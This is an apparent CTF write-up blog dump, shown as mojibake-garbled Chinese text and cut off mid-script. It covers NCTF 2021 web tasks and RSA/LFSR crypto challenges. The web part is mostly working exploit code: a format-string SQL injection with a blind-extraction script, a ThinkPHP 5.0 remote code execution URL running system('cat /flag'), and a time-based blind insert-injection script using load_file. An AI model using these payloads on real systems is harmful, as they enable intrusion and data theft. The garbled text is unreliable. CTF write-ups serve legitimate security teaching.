å¦ä¸€åŠflagåœ¨æ•°æ®åº“ä¸­ www.zip ä¸­ä¸‰ä¸ªæ–‡ä»¶ config.phpã€DB.phpã€login.phpã€‚ login.php ä¸­ä¸»é€»è¾‘ï¼š 12345678910111213141516171819202122&lt;?phpif (isset($_POST[&#x27;password&#x27;]))&#123; $query = db::prepare(&quot;SELECT * FROM `users` where password=md5(%s)&quot;, $_POST[&#x27;password&#x27;]); // (1) if (isset($_POST[&#x27;name&#x27;]))&#123; $query = db::prepare($query . &quot; and name=%s&quot;, $_POST[&#x27;name&#x27;]); // (2) &#125; else&#123; $query = $query . &quot; and name=&#x27;benjaminEngel&#x27;&quot;; &#125; $query = $query . &quot; limit 1&quot;; $result = db::commit($query); if ($result-&gt;num_rows &gt; 0)&#123; die(&#x27;NCTF&#123;ez&#x27;); &#125; else&#123; die(&#x27;Wrong name or password.&#x27;); &#125;&#125;... ä½¿ç”¨ db::prepare é¢„å¤„ç†sqlè¯­å¥ã€‚ è·Ÿè¿› DB.php çœ‹ prepare() å‡½æ•°çš„å®šä¹‰ï¼š 123456789101112131415161718192021222324252627282930313233343536public static function prepare($query, $args)&#123; if (is_null($query))&#123; return; &#125; if (strpos($query, &#x27;%&#x27;) === false)&#123; die(&#x27;%s not included in query!&#x27;); return; &#125; // get args $args = func_get_args(); array_shift( $args ); $args_is_array = false; if (is_array($args[0]) &amp;&amp; count($args) == 1 ) &#123; // (3) $args = $args[0]; $args_is_array = true; &#125; $count_format = substr_count($query, &#x27;%s&#x27;); if($count_format !== count($args))&#123; // (4) die(&#x27;Wrong number of arguments!&#x27;); return; &#125; // escape foreach ($args as &amp;$value)&#123; $value = static::$db-&gt;real_escape_string($value); // (5) &#125; // prepare $query = str_replace(&quot;%s&quot;, &quot;&#x27;%s&#x27;&quot;, $query); // (6) $query = vsprintf($query, $args); // (7) return $query;&#125; (3)å¤„ prepare() å‡½æ•°æ¥æ”¶çš„ $args ä¸ºæ•°ç»„ï¼Œ(4)å¤„ åˆ¤æ–­æ¥æ”¶å‚æ•°æ•°é‡å’Œ %s æ•°é‡æ˜¯å¦ä¸€è‡´ï¼Œ(5)å¤„è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼Œ(6)å¤„ç»™ %s åŒ¹é…çš„å‚æ•°å€¼åŠ å•å¼•å·ï¼Œ(7)å¤„æ›¿æ¢ $query ä¸­å¯¹åº”çš„ %s ä¸ºå‚æ•°å€¼ã€‚ åœ¨(1)çš„passwordå’Œ(2)çš„nameå¤„éƒ½ä½¿ç”¨äº†æ ¼å¼åŒ–å­—ç¬¦ä¸² %sï¼Œå¯ä»¥åœ¨(1)å¤„ä¼ å…¥ %s å¹²æ‰°åŒ¹é…ï¼Œå¹¶åœ¨(2)å¤„ä¼ å…¥æ•°ç»„åŒ¹é…ä¸¤å¤„ %sï¼š password=%sï¼Œname[0]=) or 1=1 --ï¼Œname[1]=x sqlè¯­å¥ç”± SELECT * FROM `users` where password=md5(%s) and name=%s limit 1 å˜ä¸º SELECT * FROM `users` where password=md5() or 1=1 -- ) and name=x limit 1ï¼Œå®ç°æ³¨å…¥ã€‚ POSTä¼ å‚è¯»åˆ°å‰åŠéƒ¨åˆ†flagï¼šNCTF&#123;3v3ryth1ng_ã€‚ æŠŠ or 1=1 æ›¿æ¢ä¸ºå¸ƒå°”ç›²æ³¨ifè¯­å¥å³å¯æ‹¿åˆ°ååŠéƒ¨åˆ†flagï¼š 12345678910111213141516171819202122232425262728293031323334353637import requestsurl = &quot;http://129.211.173.64:3080/login.php&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; payload = f&#x27;if(ascii(substr((select(group_concat(`fl@g`))from(`2021`.NcTF)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; data = &#123; &#x27;password&#x27;: &#x27;%s&#x27;, &#x27;name[0]&#x27;: f&quot;) or &#123;payload&#125; -- &quot;, &#x27;name[1]&#x27;: &#x27;s&#x27; &#125; # r = requests.get(url,params=data) r = requests.post(url,data=data) if &quot;NCTF&#123;3v3ryth1ng_&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) # not_fantast1c_:)&#125; åˆå¹¶ï¼Œflagï¼šNCTF&#123;3v3ryth1ng_not_fantast1c_:)&#125; â€‹ æ‘†å°±å®Œäº‹äº† å•Šå¯¹å¯¹å¯¹ å¤ªå¯¹è¾£å¤ªå¯¹è¾£If you get no idea about the problem,there is no harm in diffing the source code with the official one. è§‚å¯Ÿurlç»“æ„ /public/index.php/index/index/indexï¼Œç–‘ä¼¼ThinkPHPè·¯å¾„ï¼Œéšä¾¿æ”¹å†™æŠ¥é”™çŸ¥ä¸ºThinkPHP V5.0.16ã€‚ å°è¯•æœªå¼€å¯å¼ºåˆ¶è·¯ç”±RCEæ¼æ´ï¼ŒåŠ åç¼€ï¼š http://129.211.173.64:8085/public/index.php/index/index/index?s=index/\\think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt; å‡ºç°phpinfoé¡µï¼Œæ”¹æˆ &lt;?php%20system(&quot;cat /flag&quot;);?&gt; æ‹¿åˆ°flagï¼šnctf&#123;m1saka_wanna_kaibai&#125;ã€‚ â€‹ æ‘†å°±å®Œäº‹äº†2.0 å·èµ·æ¥ ä¸å‡†æ‘†ï¼ ç‰ˆæœ¬åŒä¸Šï¼Œæ”¹äº†é€»è¾‘ï¼Œæœªå¼€å¯å¼ºåˆ¶è·¯ç”±RCEæ¼æ´æ— æ•ˆã€‚ www.zip ä¸‹è½½æºç ï¼Œå‘ç°æ§åˆ¶å™¨ applicaion/index/controller/M1sakaM1yuu.phpï¼š 123456789101112131415161718192021222324252627282930&lt;?php /* * @Author: m1saka@x1ct34m * @blog: www.m1saka.love */namespace app\\index\\controller;function waf($str)&#123; if(preg_match(&quot;/system| |\\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i&quot;, $str))&#123; return true; &#125;&#125;class M1sakaM1yuu&#123; public function index() &#123; $username = request()-&gt;get(&#x27;username/a&#x27;); $str = implode(&#x27;,&#x27;,$username); if (waf($str)) &#123; return &#x27;&lt;img src=&quot;http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg&quot; alt=&quot;hutao&quot; /&gt;&#x27;; &#125; if($username)&#123; db(&#x27;m1saka&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]); return &#x27;å•Šå¯¹å¯¹å¯¹&#x27;; &#125; else &#123; return &#x27;è¯´ä»€ä¹ˆæˆ‘å°±å¼€æ‘†&#x27;;// &#125; &#125;&#125; æŒ‰ç…§ThinkPHPæ§åˆ¶å™¨è¯­æ³•ï¼ŒGETæ–¹å¼ä¼ å…¥ username å‚æ•°å€¼ï¼ˆæœ¬åœ°éƒ¨ç½²ï¼Œå¼€å¯debugè°ƒè¯•åŠŸèƒ½æµ‹è¯•ï¼‰ï¼š http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username=xxx æ­£å¸¸å›æ˜¾ å•Šå¯¹å¯¹å¯¹ã€‚ åç»­æ§åˆ¶ username å‚æ•°å€¼ï¼Œç»•è¿‡wafï¼Œå®ç°insertæ³¨å…¥ï¼š http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=if((substr((select(&quot;admin&quot;)),16,1)=&quot;n&quot;),sleep(3),0) æ›¿æ¢ä¸ºæ—¶é—´ç›²æ³¨ï¼š 123456789101112131415161718192021222324252627import requestsurl = &quot;http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=&quot;result = &#x27;&#x27;i = 15while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 payload = f&#x27;if((ascii(substr((select(load_file(&quot;/var/www/html/ffllaagg.php&quot;))),&#123;i&#125;,1))&gt;&#123;mid&#125;),sleep(0.6),0)&#x27; try: r = requests.get(url + payload,timeout=0.5) tail = mid except: head = mid + 1 if head != 32: result += chr(head) else: break print(result) å¾—åˆ°flagï¼šnctf&#123;m1saka_wanna_marry_liyuu_&#125;ã€‚ â€‹ REVERSEHello ã›ã‹ã„ æ¬¢è¿æ¥åˆ°NCTF-é€†å‘å·¥ç¨‹(Reverse Engineering)è¿™é‡Œå¯èƒ½æœ‰ä½ éœ€è¦çš„å·¥å…·:ida pro 7.6 :é“¾æ¥ï¼šhttps://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg æå–ç ï¼šo49x IDAæ‰“å¼€ï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œå‘ç°flagï¼šNCTF&#123;We1come_2_Reverse_Engineering&#125;ã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2021å¹´ä¸­å›½èƒ½æºç½‘ç»œå®‰å…¨å¤§èµ›","slug":"match-2021å¹´ä¸­å›½èƒ½æºç½‘ç»œå®‰å…¨å¤§èµ›","date":"2021-10-15T11:39:32.000Z","updated":"2021-10-16T16:00:36.995Z","comments":true,"path":"2021/10/15/match-2021å¹´ä¸­å›½èƒ½æºç½‘ç»œå®‰å…¨å¤§èµ›/","permalink":"https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"â€‹ èƒ½æºç½‘ç»œå®‰å…¨æ˜¯å›½å®¶å®æ–½èƒ½æºå®‰å…¨æˆ˜ç•¥çš„é‡è¦ä¿éšœã€‚åœ¨å›½å®¶â€œç¢³è¾¾å³°ã€ç¢³ä¸­å’Œâ€æˆ˜ç•¥ç›®æ ‡å¼•é¢†ä¸‹ï¼Œä»¥æ–°èƒ½æºä¸ºä¸»ä½“çš„æ–°å‹ç”µåŠ›ç³»ç»Ÿæ­£åŠ å¿«å»ºè®¾ï¼Œèƒ½æºä¼ä¸šæ•°å­—åŒ–è½¬å‹åŠ é€Ÿå‘å±•ï¼Œæˆ‘å›½èƒ½æºç½‘ç»œå®‰å…¨é£é™©æŒ‘æˆ˜ä»å°†æŒç»­å¢å¤§ã€‚ä¸ºæ·±å…¥è´¯å½»ä¹ è¿‘å¹³æ€»ä¹¦è®°å…³äºåˆ‡å®åšå¥½å›½å®¶å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨é˜²æŠ¤çš„é‡è¦æŒ‡ç¤ºç²¾ç¥ï¼Œè½å®ã€Šå…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤æ¡ä¾‹ã€‹çš„æœ‰å…³è¦æ±‚ï¼Œå…¨é¢æå‡æˆ‘å›½èƒ½æºè¡Œä¸šç½‘ç»œå®‰å…¨æ°´å¹³ï¼ŒåŠ å¼ºèƒ½æºç½‘ç»œå®‰å…¨äººæ‰åŸ¹å…»ä¸æŠ€æœ¯äº¤æµï¼ŒåŠ å¿«æ„å»ºâ€œæ¸…æ´ä½ç¢³ã€å®‰å…¨é«˜æ•ˆâ€çš„èƒ½æºä½“ç³»ï¼Œä¸­å›½èƒ½æºç ”ç©¶ä¼šå®šäº2021å¹´9ï½11æœˆä¸¾åŠ2021å¹´ä¸­å›½èƒ½æºç½‘ç»œå®‰å…¨å¤§èµ›æš¨ä¸­å›½èƒ½æºç½‘ç»œä¸æ•°æ®å®‰å…¨å¤§ä¼šã€‚ CRYPTORSA 123456e1=835967807536519622934604405063c1=19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710n1=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863e2=885003184250422219085124964981c2=4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400n2=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863 $n_1=n_2$ï¼ŒRSAå…±æ¨¡æ”»å‡»ã€‚ 1234567891011121314151617181920212223242526272829import gmpy2 as gpdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)n = 31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863e1 = 835967807536519622934604405063c1 = 19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710e2 = 885003184250422219085124964981c2 = 4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gp.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gp.invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(hex(m)[2:])print(bytes.fromhex(hex(m)[2:]))#666c61677b36323462306666352d326436642d313165632d623438622d6463613930343938613264627d#b&#x27;flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;&#x27; FLAG: flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125; â€‹ Base 31332b353d3f3f3f2d2d2d2d7a6d6a74706d3838757366677a6d797474736467746d65697a6c6c74787a6d657a61646a766d6f66757365677262776b7a77666a7a61796f7a646d75373d3d3d å…ˆè½¬hexå¾—åˆ° 13+5=???----zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===ï¼Œ zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7=== æ ¹æ®æ— æ•°å­—1å’Œç­‰å·ç‰¹å¾ï¼ŒçŒœæµ‹æ˜¯è½¬å°å†™çš„base32ï¼› è½¬å›å¤§å†™ï¼Œç”±å‰é¢æç¤º 13+5ï¼Œrot13+base32å¾—åˆ° fladÃ¥.Ã™..Ã….Ã.Ã•.Ã.ÃŒÃ…....ÃˆÃ¥.ÃˆÃ¤Ã...Ã•..Ã‰Ã¾ å‡ºç°flagå¤´ï¼› ç”±äº base32(&#39;flag&#123;&#39;)=MZWGCZ33ï¼Œæ•°å­—ä¸ºrot5ï¼Œå¯†æ–‡è¿˜åŸä¸º MZWGCZ33HFSTMZLGGFQTGZRVMYYGKMZRMNQWIZBSHFRTEOJXMJSWMNLBMQZH2===ï¼Œ base32 è§£ç å¾— flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;ã€‚ FLAG: flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125; â€‹ Flow æ‚ä¸ƒæ‚å…«å¯†ç çš„æ··åˆä½“ 123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Util.number import *def lfsr(status,mask): newbit = (status &lt;&lt; 1) &amp; (2**33-1) i=(status&amp;mask)&amp;(2**33-1) lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 newbit^=lastbit return (newbit,lastbit)status=1mask = 0b10110001110010011100100010110101m = b&quot;flag&#123;*************&#125;&quot;num = bytes_to_long(m)p = getPrime(1024)q = getPrime(1024)n = p*qe = 65537binp = bin(p)[2:]c = (pow(num, e, n))f=open(&quot;enc2&quot;, &quot;w+&quot;)f.write(str(n)+&quot;\\n&quot;)f.write(str(c)+&quot;\\n&quot;)f.close()f=open(&quot;enc&quot;,&quot;w+&quot;)for i in range(760): curnum = int(binp[i]) (status,out)=lfsr(status,mask) f.write(chr(curnum ^ out))f.close() LFSR + RSAé«˜ä½pæ³„éœ²æ”»å‡»ã€‚ å…ˆæ¨¡æ‹ŸLFSRæ±‚å‡º760ç»„ out 01å€¼ï¼Œç»“åˆencæ–‡ä»¶ä¸­01å¯†æ–‡ï¼Œå¼‚æˆ–è¿˜åŸ $p$ çš„é«˜760äºŒè¿›åˆ¶ä½ï¼š 1234567891011121314151617181920212223242526def lfsr(status,mask): newbit = (status &lt;&lt; 1) &amp; (2**33-1) i=(status&amp;mask)&amp;(2**33-1) lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 newbit^=lastbit return (newbit,lastbit)status = 1mask = 0b10110001110010011100100010110101c = list(bytes.fromhex(&#x27;00000100000001010001010101010000000000010000010001010000010100000001000000000101010100010001000000000000010001000000010000000001010000000101000000000000000001000100010001000101010001010101010101000101000101000000010001010001000000000001010001010100010001000000000000010000010001000000000000000000000000010101000000010101000100010001000100010101010101010001010000000100000100000101000101010001010101000101000001010000010001000100000001000101010100010100010000000101000001000101000001000101000100010100000100000101000100000100000100000000010000010100010001010100010000000100000001000001010000000000000001010101000101010100010100010001010101000100010101000100010001010101010001010000000101010001000100000000000101000001010001000101000001000100010101010001000001010001010001010101010001000100010101000001000001000100010000000100000001010001010000000101010000010001000000010000010100000000010001000001010100010101010101000000010100010100010101000000010001010101010001010100000001010001000101000100000000000100010100000001010101000100010100010100010000000100010101000001000001010001000100010001010001000101010101000000000000010100000001000000000001010000010100000001000100000000000000000101010101000000000000010001000100010001000001000100000101000101000101010101010001000001000101000101000000010100000001010001000100010101000001000101010100010001010100010100010000000001000001010000000001010001000001010000010000000001000101000100010001010101010101000101010101000000000000000101010001010001010100010100000000000000000100010101&#x27;))#print(c)pp = &#x27;&#x27;for i in range(760): (status,out) = lfsr(status,mask) pp += str(c[i]^out)pp = int(pp, 2)print(pp)#6064523798049644277925701126806650606472211004362096137261922023539261533931159712229993784486900304494092698035668254711607734547323493716579247168129613825017402250081444943555723771998431425098683590600454956058175183022718975 åˆ©ç”¨coppersmithæ”»å‡»æ–¹æ³•ï¼Œè¿›è¡Œå·²çŸ¥ $p$ é«˜ä½æ”»å‡»ï¼š 12345678910111213141516n = 20929902170717676951934620006433003604730678640645007075637305655990838672444304031857412581445836654784941618387885677741424195646067710979291690749949226354601059943673546892769474380805413381477209725509187761202889007557157174009816759858206190915193870770303140668513899480840368042056977078850633645939996806974754076338446182094408033833859119883893893710390855924917625801146138452249766835457952331243832878453385608344187234621288871394907683956060567710199168220435234555727645472494418988488158424284566395402382371954247354264148359024995803494283148151292240772247688313806712633140618802681063347059301p4 = 6020793003600505515657431119157212393365966944447518390323900168965824649782228689680274668164250924439790546808885513956693311045291390596152861670602514965058376230082977010070282487901715757886308848763512028412503942684262007e = 65537pbits = 1024kbits = pbits - p4.nbits()p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)if roots: p = p4+int(roots[0]) print(&quot;p = &quot;+str(p)) print(&quot;q = &quot;+str(n//p)) #p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209#q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389 æœ€åå¸¸è§„RSAè§£ $m$ï¼š 123456789101112import gmpy2p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389n = p * qfn = (p-1) * (q-1)e = 65537c = 12381638589055841139447839302795029653843309313978198727914736718245700098003130043532117734105184556347388175236916768083364314767482249333410320774565764577094924964983543424785959666191716662886118558538365503080964047183533841342232120086245448689762948846598689811062301086591078119426971029385906936610191899748366808606594184238261341160458933596780268681004577561284530512291876043524269456261191856680575840859843145591670082313114482813697656520320677074240863479192424768989294287655231041605257414144367688426659163486702611196512549549115716697786311455783534600599360245502989232358699920442842821956230d = gmpy2.invert(e, fn)m = pow(c, d, n)print(bytes.fromhex(hex(m)[2:]))#b&#x27;flag&#123;th1s_ls_4_eZ_quEST1on&#125;&#x27; FLAG: flag&#123;th1s_ls_4_eZ_quEST1on&#125; â€‹ NumberGame æ•°å­—çš„æ¸¸æˆ 12345e=65537(p-1)*(q-1)=15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032c=13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763invert(p,q)=63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531invert(q,p)=61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 ç»™å‡º $(p-1)(q-1),x=\\text{inv}(p,q),y=\\text{inv}(q,p),e,c$ã€‚ è¯¦ç»†æ¨å¯¼æ€è·¯å¯å‚è€ƒ HITCON 2019 - Lost Modulus Againã€‚ è§£é¢˜è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import gmpy2from itertools import productimport binasciifrom Crypto.Util.number import *&quot;&quot;&quot;alpha = p&#x27; * q&#x27; - lbeta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2i.e.:beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;if l,s are correct: alpha = k * t beta = k * (p&#x27; - l) + t * (q&#x27; - l)i.e:&quot;&quot;&quot;def alpha_from_pprime_qprime_l(pprime, qprime, l): return pprime*qprime - ldef beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha): temp1 = e*d - 1 assert temp1 % s == 0 temp2 = ((temp1 // s) - 1) * l * l temp3 = temp2 + l * (pprime + qprime) return temp3 - alpha - (pprime*qprime)def k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta): a = pprime - l b = -beta c = alpha * (qprime - l) disc = b * b - 4 * a * c assert gmpy2.is_square(disc) temp = -b + gmpy2.isqrt(disc) assert temp % (2*a) == 0 k = temp // (2*a) assert alpha % k == 0 return k, alpha // kdef brute_k_t_l(pprime, qprime, e, d): # l, s = 2, 2 ss = [s for s in range(e - 100000, e + 1000000) if s!=0 and (e*d - 1) % s == 0] for l, s in product(range(1, 5000), ss): #print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;) try: alpha = alpha_from_pprime_qprime_l(pprime, qprime, l) beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha) k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta) return k, t, l except AssertionError: continueif __name__ == &quot;__main__&quot;: e = 65537 fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 d = gmpy2.invert(e,fn) pprime = 63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531 qprime = 61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 k, t, l = brute_k_t_l(pprime, qprime, e, d) lp, lq = qprime + k, pprime + t assert lp % l == 0, lq % l == 0 p, q = lp // l, lq // l assert gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime assert gmpy2.is_prime(p), gmpy2.is_prime(q) N = p*q c = 13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763 flag_decoded = pow(c, d, N) print(long_to_bytes(flag_decoded)) #b&#x27;flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;&#x27; FLAG: flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125; â€‹ FillTheBlank æ¨å…¬å¼ï¼Ÿ 123456789101112131415161718192021from Crypto.Util.number import *import gmpy2import matha = 16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723b = &quot;**********&quot;d = 1004034638166310792730607806775703553124564601554345421260673flag=&quot;flag&#123;*************&#125;&quot;.encode(&quot;utf-8&quot;)m = bytes_to_long(flag)z = &quot;**********&quot;rb = gmpy2.invert(b, p) #påº”ä¸ºard = gmpy2.invert(d, p) #påº”ä¸ºax = rb*rdc = (m + z * rb * d % 